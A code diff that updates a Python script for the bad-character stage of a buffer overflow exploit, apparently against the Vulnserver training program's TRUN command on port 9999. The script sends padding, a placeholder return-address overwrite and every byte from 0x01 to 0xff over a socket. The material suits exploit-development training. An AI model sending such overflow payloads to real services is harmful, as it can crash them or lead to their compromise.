@@ -1,7 +1,11 @@
-#!/usr/bin/python
-import sys, socket
+#!/usr/bin/python3
+import sys
+import socket
 
-badchars = (
+target_ip = ""
+target_port = 9999
+cmd_attacking = 'TRUN /.:/'
+bad_chars = (
     "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
     "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
     "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
@@ -19,16 +23,20 @@ badchars = (
     "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
     "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
 )
-
-shellcode = "A" * <offset_value> + "B" * 4 + badchars
+offset = int(input("Enter exact offset value: "))
+shellcode = "A" * offset + "B" * 4 + bad_chars
+print("-" * 100)
 
 try:
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((< target_ip >, < port >))
-    payload = 'TRUN /.:/' + shellcode
+    s.connect((target_ip, target_port))
+    payload = cmd_attacking + shellcode
     s.send(payload.encode())
+    print("\nPayload sent. \nLook in the Hex Dump of the ESP to find bad characters.")
     s.close()
+    print("-" * 100)
 except:
     print("Error connecting to server")
+    print("-" * 100)
     sys.exit()
 
